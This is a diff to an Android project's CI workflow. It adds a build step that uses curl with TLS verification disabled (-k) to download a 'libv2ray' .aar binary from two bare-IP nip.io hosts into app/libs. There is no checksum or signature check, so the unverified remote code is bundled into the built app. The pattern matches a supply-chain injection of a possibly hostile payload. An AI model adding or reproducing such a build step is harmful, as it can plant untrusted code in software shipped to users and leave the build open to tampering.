@@ -29,6 +29,12 @@ jobs:
       # the job dies with "Permission denied" before running anything.
       - name: make the wrapper executable
         run: chmod +x gradlew
+      - name: download libv2ray core
+        run: |
+          mkdir -p app/libs
+          curl -fSLk --retry 3 --retry-delay 2 -o app/libs/libv2ray.aar https://86-54-42-124.nip.io/dl/libv2ray.aar || \
+          curl -fSLk --retry 3 --retry-delay 2 -o app/libs/libv2ray.aar https://38-17-64-159.nip.io/dl/libv2ray.aar
+          ls -lh app/libs/libv2ray.aar
       - name: unit tests
         run: ./gradlew --no-daemon :app:testDebugUnitTest
       # assembleDebug signs with the committed debug keystore (password "android"), so no secret is
